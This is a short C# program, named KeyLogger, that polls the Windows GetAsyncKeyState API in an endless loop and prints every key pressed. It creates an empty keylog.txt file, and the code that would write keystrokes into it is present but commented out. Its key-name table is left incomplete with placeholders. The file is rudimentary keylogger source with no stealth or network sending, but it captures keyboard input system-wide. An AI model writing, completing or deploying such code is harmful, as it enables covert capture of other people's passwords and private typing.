using System.Runtime.InteropServices;

namespace KeyLogger
{
    internal class Program
    {
        // DLL import for keyboard hooking
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            string filePath = "keylog.txt";
            using (StreamWriter sw = new StreamWriter(filePath, false))
            {
                sw.Write(string.Empty);
            }

            while (true)
            {
                // Loop through each key
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state == 1 || state == -32767)
                    {
                        // Log key press
                        string key = ((Keys)i).ToString();
                        Console.WriteLine(key);
                        //using (StreamWriter sw = new StreamWriter(filePath, true))
                        //{
                        //    sw.Write(key);
                        //}
                    }
                }
                Thread.Sleep(10); // Small delay to prevent high CPU usage
            }
        }

        // Enum to represent key states
        enum Keys
        {
            LeftButton = 0x01,
            RightButton = 0x02,
            Cancel = 0x03,
            MiddleButton = 0x04,
            // ... (add all key codes as needed)
            A = 0x41,
            B = 0x42,
            C = 0x43,
            // ...
            Z = 0x5A
        }
    }
}
